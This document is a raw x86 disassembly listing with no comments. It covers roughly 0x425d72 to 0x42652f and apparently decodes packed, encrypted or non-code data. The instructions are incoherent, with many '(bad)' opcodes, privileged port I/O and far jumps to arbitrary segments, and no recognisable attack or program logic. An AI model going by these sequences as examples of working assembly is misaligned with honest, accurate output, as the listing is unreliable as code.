  425d72:	out    dx,al
  425d73:	retf   0xd589
  425d76:	lods   eax,DWORD PTR ds:[esi]
  425d77:	xlat   BYTE PTR ds:[ebx]
  425d78:	(bad)  
  425d79:	sti    
  425d7a:	(bad)  
  425d7c:	mov    ss,WORD PTR [edi+ecx*2+0x72]
  425d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d81:	dec    ebp
  425d82:	aad    0xd5
  425d84:	add    DWORD PTR [eax],eax
  425d86:	repz add al,0x0
  425d89:	add    BYTE PTR [ebx],al
  425d8b:	xchg   ebx,eax
  425d8c:	sbb    ebx,edx
  425d8e:	fist   WORD PTR [esi-0x60]
  425d91:	iret   
  425d92:	mov    WORD PTR [edx+esi*1],cs
  425d95:	push   edx
  425d96:	xchg   ah,ch
  425d98:	test   al,0x73
  425d9a:	pop    es
  425d9b:	int    0x94
  425d9d:	iret   
  425d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d9f:	popf   
  425da0:	clc    
  425da1:	xchg   esp,eax
  425da2:	and    edx,DWORD PTR [eax-0x4e38d348]
  425da8:	adc    ebx,DWORD PTR [ecx+0x4b]
  425dab:	loopne 0x425df1
  425dad:	fisttp DWORD PTR [ebp-0x46]
  425db0:	xor    eax,0x7a1398e8
  425db5:	ret    
  425db6:	push   eax
  425db7:	das    
  425db8:	retf   0xd0cd
  425dbb:	jne    0x425dfb
  425dbd:	(bad)
  425dc0:	adc    DWORD PTR [eax-0x3c],edx
  425dc3:	fsub   st(1),st
  425dc5:	aam    0x92
  425dc7:	pushf  
  425dc8:	mov    ah,0x9d
  425dca:	mov    edx,edx
  425dcc:	pushf  
  425dcd:	clc    
  425dce:	sub    DWORD PTR [ecx-0x2f],esi
  425dd1:	inc    edx
  425dd2:	aas    
  425dd3:	mov    ebx,0x70bcbea4
  425dd8:	sub    al,0x54
  425dda:	mov    edi,0x5ba03a30
  425ddf:	pop    edx
  425de0:	adc    ah,BYTE PTR [edi]
  425de2:	dec    edx
  425de3:	test   DWORD PTR ds:0xa132f573,eax
  425de9:	(bad)  
  425dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425deb:	add    BYTE PTR [edx],ah
  425ded:	jns    0x425daf
  425def:	ja     0x425dda
  425df1:	je     0x425e0a
  425df3:	repz or eax,DWORD PTR ds:[esi]
  425df7:	test   al,0x93
  425df9:	push   0xf6f884d3
  425dfe:	(bad)  
  425e00:	imul   esp,DWORD PTR [eax+edx*8+0x22],0x6a511588
  425e08:	push   cs
  425e09:	jnp    0x425e1d
  425e0b:	dec    ecx
  425e0c:	xchg   esp,eax
  425e0d:	aad    0xa
  425e0f:	into   
  425e10:	call   0x6a:0xdc89736b
  425e17:	sbb    BYTE PTR [esi+0x31],ah
  425e1a:	dec    esi
  425e1b:	sbb    edi,DWORD PTR [ebx-0x6c]
  425e1e:	jmp    0x9bdb:0x5b8c929d
  425e25:	mov    eax,0xa2e23d69
  425e2a:	inc    edi
  425e2b:	sahf   
  425e2c:	jl     0x425dbb
  425e2e:	cmp    DWORD PTR [edi+0x2a891d7c],edi
  425e34:	out    0x10,eax
  425e36:	and    BYTE PTR [eax-0xa],ch
  425e39:	cli    
  425e3a:	mov    dh,0xa1
  425e3c:	in     eax,dx
  425e3d:	xchg   esp,eax
  425e3e:	xor    bh,BYTE PTR [ebx+0x5e2d0161]
  425e44:	or     DWORD PTR [eax],0xde912fac
  425e4a:	or     bh,BYTE PTR [ebx]
  425e4c:	cmp    eax,DWORD PTR [esi]
  425e4e:	pusha  
  425e4f:	fwait
  425e50:	in     eax,dx
  425e51:	sub    DWORD PTR [edx-0x17315f48],edx
  425e57:	inc    edx
  425e58:	call   0xa7b4:0xb97637e5
  425e5f:	jbe    0x425e4c
  425e61:	and    DWORD PTR [ebx+0x43],eax
  425e64:	fcom   DWORD PTR [eax]
  425e66:	xchg   DWORD PTR [esi-0x4ad79fb7],esp
  425e6c:	mov    eax,ds:0x8fe15839
  425e71:	imul   ebp,DWORD PTR [edx+0x16],0xa38e027c
  425e78:	ja     0x425e49
  425e7a:	jne    0x425e85
  425e7c:	outs   dx,DWORD PTR ds:[esi]
  425e7d:	dec    eax
  425e7e:	imul   edx,DWORD PTR [edi],0xffffffb4
  425e81:	jg     0x425e8d
  425e83:	vmaxss xmm4,xmm4,DWORD PTR [eax+ebp*4-0x6f27dfe9]
  425e8d:	adc    ecx,DWORD PTR [eax+0x50af57a8]
  425e93:	gs pusha 
  425e95:	mov    eax,0xdb661cfb
  425e9a:	mov    eax,0xab9582b5
  425e9f:	mov    ebp,DWORD PTR [ebx]
  425ea1:	jbe    0x425e36
  425ea3:	add    al,0x2e
  425ea5:	cs mov ebp,0x6c3fd934
  425eab:	addr16 stc 
  425ead:	jl     0x425ed6
  425eaf:	sbb    BYTE PTR [edi],0x24
  425eb2:	mov    ebp,0x753db593
  425eb7:	push   ebx
  425eb8:	jg     0x425e8e
  425eba:	sahf   
  425ebb:	dec    edi
  425ebc:	jae    0x425eac
  425ebe:	xchg   ebx,eax
  425ebf:	xchg   edi,eax
  425ec0:	je     0x425ea1
  425ec2:	aam    0xd3
  425ec4:	repnz push es
  425ec6:	pcmpgtd mm6,mm5
  425ec9:	in     eax,0xf5
  425ecb:	xchg   BYTE PTR [edx-0x52fc0f],bl
  425ed1:	cmp    ecx,DWORD PTR [eax+0x7a56743e]
  425ed7:	fdivr  QWORD PTR [ecx-0x6c31f89b]
  425edd:	cmp    al,0x14
  425edf:	sbb    esp,DWORD PTR [ebx]
  425ee1:	push   es
  425ee2:	mov    eax,DWORD PTR ds:0x418fe41b
  425ee8:	mov    al,BYTE PTR [ecx+ecx*1-0x3ff7e703]
  425eef:	xor    al,BYTE PTR [esi]
  425ef1:	scas   eax,DWORD PTR es:[edi]
  425ef2:	shr    BYTE PTR [esp+ecx*4-0x3eea2e0],0x96
  425efa:	cmp    bh,BYTE PTR [ebx]
  425efc:	lds    eax,FWORD PTR [eax+0x8]
  425eff:	pop    edx
  425f00:	jmp    0x425f80
  425f02:	adc    cl,BYTE PTR [esi+0xc675041]
  425f08:	in     eax,dx
  425f09:	ror    DWORD PTR [ebx],cl
  425f0b:	sbb    eax,0x146e35fe
  425f10:	pop    ebx
  425f11:	arpl   sp,bp
  425f13:	push   cs
  425f14:	inc    ebp
  425f15:	mov    ds:0xa22f0e4d,al
  425f1a:	adc    DWORD PTR ds:0x650119b0,esp
  425f20:	add    al,0xab
  425f22:	jg     0x425f75
  425f24:	xchg   ebp,eax
  425f25:	cmp    eax,0x1fb5283d
  425f2a:	jmp    0x425ebf
  425f2c:	xchg   esp,eax
  425f2d:	cdq    
  425f2e:	dec    eax
  425f2f:	cli    
  425f30:	sbb    BYTE PTR [eax+0xd2da953],cl
  425f36:	sub    al,0xea
  425f38:	xlat   BYTE PTR ds:[ebx]
  425f39:	in     al,dx
  425f3a:	add    al,0x35
  425f3c:	push   ss
  425f3d:	adc    esp,ebp
  425f3f:	call   0xbaecccfd
  425f44:	ret    
  425f45:	test   ch,0x14
  425f48:	push   cs
  425f49:	enter  0x82bc,0xde
  425f4d:	retf   
  425f4e:	in     eax,0x2b
  425f50:	scas   al,BYTE PTR es:[edi]
  425f51:	pusha  
  425f52:	into   
  425f53:	stos   BYTE PTR es:[edi],al
  425f54:	push   0x37
  425f56:	add    al,0x96
  425f58:	out    0xe2,eax
  425f5a:	xchg   edi,ecx
  425f5c:	mov    esi,0xe8753ee0
  425f61:	cmp    BYTE PTR [ecx+0x72bf3cad],dh
  425f67:	inc    eax
  425f68:	sub    dl,BYTE PTR [edi+ebp*4]
  425f6b:	stos   BYTE PTR es:[edi],al
  425f6c:	sub    al,BYTE PTR [ecx]
  425f6e:	sbb    eax,0x1f106f23
  425f73:	fwait
  425f74:	dec    ecx
  425f75:	scas   al,BYTE PTR es:[edi]
  425f76:	mov    ds:0x4c28e951,al
  425f7b:	int3   
  425f7c:	pusha  
  425f7d:	in     al,0xd9
  425f7f:	int    0x20
  425f81:	lahf   
  425f82:	push   eax
  425f83:	sub    al,0x37
  425f85:	pusha  
  425f86:	xchg   esi,eax
  425f87:	fcomp  QWORD PTR [ebx+eax*8-0x677d3ae1]
  425f8e:	mov    WORD PTR [edx],gs
  425f90:	inc    eax
  425f91:	mov    ebx,0x51cafa24
  425f96:	imul   edx,DWORD PTR [esp+ebx*2-0x59],0xffffffc6
  425f9b:	(bad)  
  425f9c:	pushf  
  425f9d:	gs loope 0x425f92
  425fa0:	push   ebp
  425fa1:	cmp    al,0x4e
  425fa3:	push   ecx
  425fa4:	rcr    BYTE PTR [edi+0x58f54aa8],cl
  425faa:	xor    BYTE PTR [ecx+ebx*4],bh
  425fad:	repz sub BYTE PTR [esi],dh
  425fb0:	retf   0x70e7
  425fb3:	jge    0x425f54
  425fb5:	add    al,0xb0
  425fb7:	add    eax,0x89be1141
  425fbc:	gs push esi
  425fbe:	std    
  425fbf:	jmp    0xe28d03c
  425fc4:	sbb    eax,0x62a769fc
  425fc9:	pusha  
  425fca:	mov    ebp,0x5fb268c0
  425fcf:	scas   eax,DWORD PTR es:[edi]
  425fd0:	sub    al,0xd7
  425fd2:	popf   
  425fd3:	sub    BYTE PTR [eax+ecx*2+0x4f],0xf0
  425fd8:	adc    eax,0x561dd7a2
  425fdd:	mov    esi,0x510e6aa6
  425fe2:	mov    gs,WORD PTR [ecx+edx*1]
  425fe5:	xchg   ch,cl
  425fe7:	out    0x69,eax
  425fe9:	adc    dl,BYTE PTR [edi-0x16]
  425fec:	and    esi,DWORD PTR [edi+0x75]
  425fef:	std    
  425ff0:	bound  eax,QWORD PTR [ecx]
  425ff2:	test   BYTE PTR [eax-0x10],dl
  425ff5:	xchg   edx,eax
  425ff6:	shr    DWORD PTR [ebp-0x72a1e753],cl
  425ffc:	pop    ebx
  425ffd:	push   ecx
  425ffe:	outs   dx,DWORD PTR ds:[esi]
  425fff:	pushf  
  426000:	mov    al,ds:0xf01c9129
  426005:	adc    al,0x9b
  426007:	in     al,dx
  426008:	fs cmp bl,0xec
  42600c:	icebp  
  42600d:	fs inc edx
  42600f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426010:	pop    eax
  426011:	jle    0x425fd6
  426013:	fldenv [edx-0x737257bc]
  426019:	jmp    0x4fa5ff3c
  42601e:	mov    dh,0x73
  426020:	aaa    
  426021:	call   0x74c1:0xb3f3360f
  426028:	push   edx
  426029:	inc    esi
  42602a:	ret    
  42602b:	push   esp
  42602c:	into   
  42602d:	fistp  WORD PTR [esi]
  42602f:	or     esp,DWORD PTR [ebx]
  426031:	dec    eax
  426032:	jp     0x426004
  426034:	pusha  
  426035:	ins    DWORD PTR es:[edi],dx
  426036:	and    eax,0x2cb5b57c
  42603b:	and    eax,0xa4d54e40
  426040:	data16 cmp ch,BYTE PTR [eax-0x69]
  426044:	push   edx
  426045:	imul   ebp,DWORD PTR [ecx],0xab2a425e
  42604b:	jle    0x426073
  42604d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42604e:	fwait
  42604f:	mov    ah,BYTE PTR [ecx-0x6da848b7]
  426055:	dec    ebp
  426056:	cs out 0x8c,al
  426059:	dec    edi
  42605a:	xor    al,ah
  42605c:	aas    
  42605d:	out    0xb7,eax
  42605f:	push   0xa596b106
  426064:	mov    eax,ds:0x6ede9399
  426069:	inc    eax
  42606a:	jne    0x426056
  42606c:	aaa    
  42606d:	jbe    0x426063
  42606f:	cwde   
  426070:	sub    eax,DWORD PTR [edx+eiz*1+0x58]
  426074:	mov    edi,0x4102e8fc
  426079:	cmp    al,0x51
  42607b:	inc    esi
  42607c:	inc    edx
  42607d:	(bad)  
  42607e:	and    eax,0x8f66fc0e
  426083:	and    BYTE PTR [edi*8-0x6d7c8157],0xca
  42608b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42608c:	inc    edi
  42608d:	sub    ebx,DWORD PTR [esi+0x78329f42]
  426093:	mov    ds,WORD PTR [eax+edx*2+0x3b]
  426097:	bound  edi,QWORD PTR [esp+ebp*4-0x50938c34]
  42609e:	xchg   ebp,eax
  42609f:	in     eax,0x2a
  4260a1:	cmp    bl,BYTE PTR [ecx-0x3b]
  4260a4:	jnp    0x4260bc
  4260a6:	gs jb  0x42603b
  4260a9:	and    eax,0x3f09d3a3
  4260ae:	mov    ds:0x2185bb5b,eax
  4260b3:	retf   0x96ad
  4260b6:	mov    es,WORD PTR [eax-0x65]
  4260b9:	pop    ss
  4260ba:	sbb    bh,BYTE PTR [eax+0x2196ed98]
  4260c0:	inc    eax
  4260c1:	nop
  4260c2:	jecxz  0x4260a2
  4260c4:	cmp    ebp,ebp
  4260c6:	jmp    0x2c57:0x463c745
  4260cd:	int    0xd5
  4260cf:	in     al,dx
  4260d0:	dec    ebp
  4260d1:	out    0xf3,al
  4260d3:	xchg   ecx,eax
  4260d4:	aaa    
  4260d5:	sbb    edi,DWORD PTR [eax+0x1]
  4260d8:	in     eax,0x60
  4260da:	add    eax,0xd7778b4a
  4260df:	out    0xfe,eax
  4260e1:	xchg   esp,eax
  4260e2:	(bad)  [eax+0x45]
  4260e5:	stos   BYTE PTR es:[edi],al
  4260e6:	jb     0x42612f
  4260e8:	cmp    eax,0xcaf387b3
  4260ed:	out    dx,eax
  4260ee:	sbb    BYTE PTR [ebp+0x20],al
  4260f1:	inc    edi
  4260f2:	inc    esp
  4260f3:	pushf  
  4260f4:	push   0xffffff93
  4260f6:	dec    ebx
  4260f7:	cmc    
  4260f8:	jnp    0x4260d8
  4260fa:	and    DWORD PTR [ecx+esi*2],esp
  4260fd:	int    0x95
  4260ff:	xchg   edx,eax
  426100:	repz inc ebx
  426102:	clc    
  426103:	mov    BYTE PTR [edx],ch
  426105:	scas   eax,DWORD PTR es:[edi]
  426106:	add    BYTE PTR [edi+esi*1],bl
  426109:	push   ebx
  42610a:	xor    eax,0xfc05d704
  42610f:	mov    esp,0x67b19bed
  426114:	pop    ds
  426115:	or     BYTE PTR [edi],ah
  426117:	jmp    0x426148
  426119:	nop
  42611a:	mov    ebx,DWORD PTR [ecx+0x39]
  42611d:	int    0x2b
  42611f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426120:	addps  xmm2,xmm3
  426123:	mov    esp,0x73b7d386
  426128:	jb     0x426140
  42612a:	push   eax
  42612b:	mov    bx,0x9419
  42612f:	push   0xffffff87
  426131:	mov    esi,ss
  426133:	mov    cl,0xaa
  426135:	sub    esi,0x12ca6ece
  42613b:	popa   
  42613c:	jle    0x4260f7
  42613e:	sar    DWORD PTR [eax],1
  426140:	dec    esi
  426141:	sbb    esp,DWORD PTR [edi-0x72]
  426144:	mov    ds:0xb493e942,eax
  426149:	inc    ecx
  42614a:	xchg   BYTE PTR [edx],ah
  42614c:	jecxz  0x4260fb
  42614e:	fidivr WORD PTR [ecx-0x1c]
  426151:	popa   
  426152:	pop    ecx
  426153:	mov    BYTE PTR [edx],dh
  426155:	popf   
  426156:	ins    DWORD PTR es:[edi],dx
  426157:	inc    ebp
  426158:	cmp    eax,0x32f48066
  42615d:	pop    eax
  42615e:	aad    0xa2
  426160:	dec    ebp
  426161:	aaa    
  426162:	arpl   WORD PTR [esi-0x1ba6a5d4],di
  426168:	div    ebp
  42616a:	hlt    
  42616b:	fld    TBYTE PTR [esi]
  42616d:	inc    ebp
  42616e:	retf   
  42616f:	int    0xe8
  426171:	or     DWORD PTR [esi+ebp*2-0x67419bd2],ebx
  426178:	mov    eax,ds:0xce43a21c
  42617d:	dec    edx
  42617e:	cmp    bl,al
  426180:	and    ecx,DWORD PTR [eax+0x72]
  426183:	jno    0x42614b
  426185:	xchg   ecx,eax
  426186:	loop   0x42613a
  426188:	and    ecx,ecx
  42618a:	sbb    al,0x87
  42618c:	addr16 sub al,0xa7
  42618f:	addr16 lock pushf 
  426192:	push   DWORD PTR [edx-0x6e]
  426195:	cwde   
  426196:	out    dx,al
  426197:	mov    bl,0xa1
  426199:	stc    
  42619a:	sub    ecx,DWORD PTR [edx+0x14]
  42619d:	stc    
  42619e:	retf   
  42619f:	jl     0x426134
  4261a1:	inc    edi
  4261a2:	and    al,BYTE PTR [edi]
  4261a4:	jecxz  0x42619a
  4261a6:	xor    eax,DWORD PTR ds:0x54179de5
  4261ac:	and    ebp,DWORD PTR [ecx+0x3376cd6f]
  4261b2:	nop
  4261b3:	mov    edi,0x4e056287
  4261b8:	popf   
  4261b9:	adc    edi,DWORD PTR [ecx+0x4d0cd21b]
  4261bf:	(bad)  
  4261c0:	out    0x4e,al
  4261c2:	add    ch,BYTE PTR ds:0x761bd67f
  4261c8:	cmp    ch,BYTE PTR [edx+edi*2-0x77]
  4261cc:	mov    dh,0xf7
  4261ce:	mov    dl,BYTE PTR [ebx-0x1fd40bb]
  4261d4:	call   0xfc86fb9a
  4261d9:	inc    esi
  4261da:	rol    DWORD PTR [eax-0x61ec48a4],cl
  4261e0:	mov    dl,0x6
  4261e2:	sub    eax,0x36f4b01c
  4261e7:	push   cs
  4261e8:	mov    al,0xe2
  4261ea:	dec    esp
  4261eb:	hlt    
  4261ec:	pop    ecx
  4261ed:	cmp    DWORD PTR [edx+0x5f],0xcf4c919
  4261f4:	fs jmp 0x5eed:0x62da7a62
  4261fc:	test   al,0x50
  4261fe:	ss mov esi,0x87f732b
  426204:	loope  0x42621f
  426206:	call   0x6bbe:0x93afd982
  42620d:	out    dx,al
  42620e:	mov    BYTE PTR [edi+0x5d],cl
  426211:	jle    0x42621b
  426213:	shr    esp,0x2d
  426216:	mov    edi,0xe04d6972
  42621b:	inc    edx
  42621c:	fisubr DWORD PTR [ebx+0x4a5d03db]
  426222:	xor    bl,BYTE PTR [eax]
  426224:	mov    cs,WORD PTR [ebx-0xbc3dfe3]
  42622a:	retw   0xd62d
  42622e:	mov    ss,WORD PTR [ecx+ebx*1-0x55]
  426232:	or     DWORD PTR [esi+0x66],ebx
  426235:	adc    al,0xd3
  426237:	inc    eax
  426238:	leave  
  426239:	test   DWORD PTR [edx+0x24e2a095],edx
  42623f:	in     al,0x17
  426241:	shr    DWORD PTR [ebp+0x6d],1
  426244:	arpl   WORD PTR [eax],ax
  426246:	ror    BYTE PTR [esi+ecx*2-0x38],cl
  42624a:	cld    
  42624b:	and    eax,0x40f42029
  426250:	ret    
  426251:	push   ebx
  426252:	sti    
  426253:	jle    0x426274
  426255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426256:	dec    esi
  426257:	jle    0x42622d
  426259:	add    BYTE PTR [esi-0x38952957],ah
  42625f:	inc    ebx
  426260:	(bad)  
  426261:	aaa    
  426262:	mov    WORD PTR [eax],ds
  426264:	jecxz  0x4262a9
  426266:	je     0x426242
  426268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426269:	push   eax
  42626a:	xchg   bh,ah
  42626c:	mov    esp,0x7315af82
  426271:	int3   
  426272:	wbinvd 
  426274:	cmc    
  426275:	pop    ss
  426276:	fistp  DWORD PTR [ebp+edx*2+0x1e9d4b06]
  42627d:	add    BYTE PTR [eax],al
  42627f:	add    BYTE PTR [eax],al
  426281:	add    BYTE PTR [ecx-0x3d],dh
  426284:	loop   0x426271
  426286:	bnd jmp 0x426302
  426289:	fcomi  st,st(7)
  42628b:	mov    edi,db7
  42628e:	dec    edi
  42628f:	sub    DWORD PTR [ebx+0x1dac8f1],ebx
  426295:	add    bl,dh
  426297:	add    al,0x0
  426299:	add    BYTE PTR [edi+0x1a],bh
  42629c:	ret    
  42629d:	inc    cx
  42629f:	pop    ebx
  4262a0:	mov    al,ds:0x8a9405f3
  4262a5:	adc    al,0x84
  4262a7:	push   ds
  4262a8:	and    dl,BYTE PTR ds:0xc4d5673c
  4262ae:	sbb    al,0xae
  4262b0:	clc    
  4262b1:	scas   eax,DWORD PTR es:[edi]
  4262b2:	gs daa 
  4262b4:	fnstcw WORD PTR [ecx]
  4262b6:	inc    edx
  4262b7:	repnz mov DWORD PTR cs:[esp+edi*8+0x3d],esp
  4262bd:	push   ebx
  4262be:	retf   0x3c97
  4262c1:	xchg   ecx,eax
  4262c2:	jae    0x4262b3
  4262c4:	push   eax
  4262c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262c6:	push   0x7d28a534
  4262cb:	cli    
  4262cc:	adc    eax,0x94ca2cc4
  4262d1:	stc    
  4262d2:	mov    dh,0xb
  4262d4:	enter  0x7a07,0xe7
  4262d8:	mov    ebp,0xb41f04e2
  4262dd:	mov    edx,0x4e885512
  4262e2:	call   FWORD PTR [ebp+0x4c]
  4262e5:	sbb    al,0x5b
  4262e7:	mov    cl,0x6b
  4262e9:	dec    ebx
  4262ea:	retf   0x8bf7
  4262ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262ee:	inc    edx
  4262ef:	push   ss
  4262f0:	out    0x28,al
  4262f2:	xchg   ecx,eax
  4262f3:	cld    
  4262f4:	pop    esp
  4262f5:	call   0xb4e1e0a4
  4262fa:	push   ss
  4262fb:	cwde   
  4262fc:	jnp    0x42636c
  4262fe:	test   BYTE PTR [edi-0x36],0x31
  426302:	das    
  426303:	ins    BYTE PTR es:[edi],dx
  426304:	sahf   
  426305:	inc    esp
  426306:	adc    al,0x0
  426308:	std    
  426309:	adc    al,BYTE PTR [eax+0x5]
  42630c:	mov    WORD PTR [esi+0x1f501786],?
  426312:	cmp    bl,BYTE PTR [ebx-0x72]
  426315:	jecxz  0x426313
  426317:	je     0x426331
  426319:	mov    edi,0xf67286fd
  42631e:	cmp    al,0x73
  426321:	jb     0x42632b
  426323:	stc    
  426324:	and    esi,0x8e35a4d3
  42632a:	shl    DWORD PTR [ebx-0x19],1
  42632d:	sub    al,0x43
  42632f:	push   esi
  426330:	or     BYTE PTR [ebx+0x0],ah
  426333:	xchg   ebp,eax
  426334:	dec    esp
  426335:	or     BYTE PTR [eax+0x6a],ah
  426338:	fwait
  426339:	les    eax,FWORD PTR [edx]
  42633b:	(bad)
  426340:	jo     0x426318
  426342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426343:	xor    dh,0xef
  426346:	jmp    0x5d51b76f
  42634b:	jb     0x42631a
  42634d:	push   ss
  42634e:	jmp    0xcf34:0xe3f227dc
  426355:	mov    BYTE PTR [edx-0x4df01ac6],dh
  42635b:	xor    dl,0xa0
  42635e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42635f:	jecxz  0x42630c
  426361:	or     eax,0xf37e516a
  426366:	es pop esi
  426368:	aaa    
  426369:	retf   
  42636a:	adc    DWORD PTR [esi-0x5b],ebx
  42636d:	aam    0xa9
  42636f:	mov    BYTE PTR [edx],bl
  426371:	pop    ss
  426372:	inc    ebx
  426373:	cwde   
  426374:	dec    ecx
  426375:	or     DWORD PTR [eax+0x43f451b5],esi
  42637b:	inc    eax
  42637c:	push   esi
  42637d:	fistp  WORD PTR [esi-0x2f]
  426380:	ins    BYTE PTR es:[edi],dx
  426381:	scas   al,BYTE PTR es:[edi]
  426382:	inc    edi
  426383:	iret   
  426384:	(bad)  
  426385:	mov    ebx,0x22f4490
  42638a:	sahf   
  42638b:	mov    edx,0x8b1e9922
  426390:	mov    al,ds:0x851e32cf
  426395:	jb     0x42638f
  426397:	in     eax,0x92
  426399:	sub    al,0x89
  42639b:	mov    al,0x46
  42639d:	aam    0x14
  42639f:	pop    ecx
  4263a0:	pop    edi
  4263a1:	inc    esp
  4263a2:	int    0xa5
  4263a4:	mov    esi,0x9f28cd13
  4263a9:	enter  0xdc18,0xd
  4263ad:	push   esp
  4263ae:	sub    cl,BYTE PTR [ecx+ebx*8-0x6d]
  4263b2:	pop    esi
  4263b3:	nop
  4263b4:	inc    ecx
  4263b5:	sahf   
  4263b6:	retf   0xe954
  4263b9:	cmp    DWORD PTR [ecx],ebp
  4263bb:	es cmp eax,0x687e91c3
  4263c1:	imul   eax,DWORD PTR [edi-0x1],0x53c1329e
  4263c8:	rcr    DWORD PTR [esi+0x7e],0x41
  4263cc:	sub    eax,0x8b81368f
  4263d1:	in     eax,0x46
  4263d3:	in     al,dx
  4263d4:	jno    0x4263c8
  4263d6:	bound  ebx,QWORD PTR [edi+edx*1+0x39]
  4263da:	outs   dx,BYTE PTR ds:[esi]
  4263db:	aaa    
  4263dc:	or     al,0x8d
  4263de:	sub    eax,0x2670518e
  4263e3:	in     al,0x77
  4263e5:	pop    esi
  4263e6:	jb     0x4263b7
  4263e8:	into   
  4263e9:	(bad)  
  4263ea:	call   0xa0c8:0xcaa4a3ce
  4263f1:	add    al,BYTE PTR [eax+0x556344d]
  4263f7:	push   esi
  4263f8:	dec    eax
  4263f9:	xchg   ebx,eax
  4263fa:	int3   
  4263fb:	fs ins BYTE PTR es:[edi],dx
  4263fd:	ins    DWORD PTR es:[edi],dx
  4263fe:	mov    ds:0x45ff52a9,eax
  426403:	jbe    0x426411
  426405:	test   al,0x4e
  426407:	ja     0x4263cb
  426409:	ins    DWORD PTR es:[edi],dx
  42640a:	cli    
  42640b:	add    DWORD PTR [edi-0x20d7740],esi
  426411:	inc    esi
  426412:	fwait
  426413:	gs pop ecx
  426416:	(bad)  
  426417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426418:	sbb    BYTE PTR [ecx-0x40],ch
  42641b:	rol    DWORD PTR [edi+0x2d],1
  42641e:	pop    esi
  42641f:	retf   0xdcd0
  426422:	or     dl,BYTE PTR [edx+0xe747e71]
  426428:	in     eax,dx
  426429:	outs   dx,BYTE PTR ds:[esi]
  42642a:	(bad)  
  42642b:	xchg   esi,eax
  42642c:	adc    esi,DWORD PTR [ecx+ebp*8-0x384a24a3]
  426433:	mov    BYTE PTR [eax],al
  426435:	mov    bh,0x9a
  426437:	sbb    cl,BYTE PTR [esi+0x28]
  42643a:	popf   
  42643b:	lea    ecx,[eax+0x23ff2998]
  426441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426442:	es dec edi
  426444:	push   esi
  426445:	mov    eax,eax
  426447:	lods   eax,DWORD PTR ds:[esi]
  426448:	add    al,0x9a
  42644a:	jecxz  0x426463
  42644c:	pop    edx
  42644d:	loope  0x42644c
  42644f:	and    edi,DWORD PTR [ebx-0x3b4c0564]
  426455:	retf   0x5ca8
  426458:	icebp  
  426459:	test   eax,0xc03922bb
  42645e:	pusha  
  42645f:	(bad)  
  426460:	iret   
  426461:	and    esi,DWORD PTR [eax+esi*1+0x15f253ac]
  426468:	jge    0x426471
  42646a:	push   edi
  42646b:	and    BYTE PTR [ecx+0x60c4a28a],al
  426471:	repnz add eax,DWORD PTR [ebp+0x20]
  426475:	xchg   ecx,eax
  426476:	and    DWORD PTR ss:[edi],edi
  426479:	push   edi
  42647a:	push   esi
  42647b:	test   DWORD PTR [edx],esp
  42647d:	fsubr  QWORD PTR [eax-0x35b7728d]
  426483:	jle    0x4264cc
  426485:	leave  
  426486:	popf   
  426487:	pop    edx
  426488:	test   eax,0x64dac55b
  42648d:	repnz and eax,0xfb9acd45
  426493:	jo     0x4264d4
  426495:	mov    DWORD PTR [eax+0xe],esp
  426498:	adc    edx,esi
  42649a:	and    dh,BYTE PTR [ebx-0x22c5e923]
  4264a0:	inc    edi
  4264a1:	cmp    ch,BYTE PTR [eax+0x30139a8e]
  4264a7:	pushf  
  4264a8:	xor    ecx,edx
  4264aa:	adc    esp,DWORD PTR [edx+0x7009245f]
  4264b0:	mov    ecx,0xc7920349
  4264b5:	(bad)
  4264b8:	xlat   BYTE PTR ds:[ebx]
  4264b9:	jno    0x4264c6
  4264bb:	mov    dl,0xb7
  4264be:	or     BYTE PTR [esi+0x75],0x12
  4264c2:	aas    
  4264c3:	mov    esi,0x885b376c
  4264c8:	pop    ds
  4264c9:	pop    ds
  4264ca:	xchg   esp,eax
  4264cb:	sbb    ecx,eax
  4264cd:	inc    ebp
  4264ce:	or     DWORD PTR [ebp+0x50e0ec26],0x0
  4264d5:	xchg   BYTE PTR [ebx],cl
  4264d7:	pop    eax
  4264d8:	and    BYTE PTR [ebx-0x22],0x62
  4264dc:	push   esp
  4264dd:	shl    BYTE PTR [edx+0x67012b9a],cl
  4264e3:	mov    esp,DWORD PTR [edx-0x13]
  4264e6:	int    0xc3
  4264e8:	mov    eax,ds:0xebf0b947
  4264ed:	(bad)  
  4264ee:	icebp  
  4264ef:	adc    BYTE PTR [ecx],bh
  4264f1:	mov    ch,BYTE PTR [edx-0x187a807]
  4264f7:	inc    ebp
  4264f8:	aaa    
  4264f9:	push   0x6f
  4264fb:	in     eax,dx
  4264fc:	sahf   
  4264fd:	push   esi
  4264fe:	dec    DWORD PTR [ebp-0x7f]
  426501:	lods   al,BYTE PTR ds:[esi]
  426502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426503:	std    
  426504:	into   
  426505:	sbb    ebx,DWORD PTR [edi+0x43]
  426508:	in     eax,0xcb
  42650a:	(bad)  
  42650c:	hlt    
  42650d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42650e:	push   esp
  42650f:	xchg   ebp,eax
  426510:	sub    ecx,esp
  426512:	outs   dx,BYTE PTR ds:[si]
  426514:	push   es
  426515:	push   0xffffffac
  426517:	sti    
  426518:	or     eax,DWORD PTR [esi+0x69]
  42651b:	in     eax,dx
  42651c:	stos   BYTE PTR es:[edi],al
  42651d:	and    al,0xe5
  42651f:	les    ecx,FWORD PTR [eax+0x11]
  426522:	mov    ah,0x8c
  426524:	sbb    dh,bh
  426526:	push   es
  426527:	je     0x4264b6
  426529:	sahf   
  42652a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42652b:	or     al,0xc6
  42652d:	loop   0x42651d
  42652f:	inc    edi
